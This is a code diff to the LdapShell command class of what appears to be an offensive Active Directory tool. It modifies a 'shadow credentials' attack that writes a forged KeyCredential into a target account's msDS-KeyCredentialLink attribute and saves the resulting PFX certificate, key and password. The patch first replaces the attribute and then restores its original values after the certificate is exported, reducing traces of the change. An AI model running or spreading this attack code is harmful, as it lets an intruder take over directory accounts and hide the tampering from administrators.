@@ -636,7 +636,8 @@ class LdapShell(cmd.Cmd):
         print("KeyCredential generated with DeviceID: %s" % uuid.UUID(bytes=device_id))
 
         try:
-            new_values = target['msDS-KeyCredentialLink'].raw_values + [shadow_credentials.toDNWithBinary2String(keyCredential.dumpBinary(), target.entry_dn)]
+            old_values = target['msDS-KeyCredentialLink'].raw_values
+            new_values = [shadow_credentials.toDNWithBinary2String(keyCredential.dumpBinary(), target.entry_dn)]
             self.client.modify(target.entry_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             print("Shadow credentials successfully added!")
             if self.client.result['result'] == 0:
@@ -645,6 +646,8 @@ class LdapShell(cmd.Cmd):
                 shadow_credentials.exportPFX(certificate, key, password=password, path_to_file=path)
                 print("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                 print("Must be used with password: %s" % password)
+                self.client.modify(target.entry_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, old_values]})
+                print("Successfully restored old values")
             else:
                 if self.client.result['result'] == 50:
                     print('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
